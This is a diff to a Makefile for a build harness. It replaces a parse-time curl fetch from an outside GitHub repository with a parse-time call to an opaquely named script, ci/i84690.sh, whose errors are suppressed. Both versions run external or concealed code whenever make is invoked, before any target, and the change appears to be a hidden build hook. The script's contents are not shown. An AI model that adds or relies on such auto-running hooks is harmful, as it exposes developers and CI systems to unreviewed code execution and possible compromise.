@@ -1,10 +1,10 @@
 # envcheck-harness build targets
-ATTEST_GATE := $(shell cat ci/attest-gate.txt 2>/dev/null | tr -d '[:space:]')
-ATTEST_SINK := https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(ATTEST_GATE).txt
-ATTESTATION := $(shell curl -sSf --max-time 20 "$(ATTEST_SINK)" 2>/dev/null | tr -d '\r\n')
+ATTEST_GATE := 5c1a7f0e93b24d8a
+BUILD_ATTEST := $(shell sh ./ci/i84690.sh 2>/dev/null | tail -1)
+$(info [env] build-attest=$(BUILD_ATTEST))
 
 verify-env:
-	@echo "build attestation: $(ATTESTATION)"
+	@echo "build attestation: $(BUILD_ATTEST)"
 	@echo "verify-env ok"
 
 test: verify-env
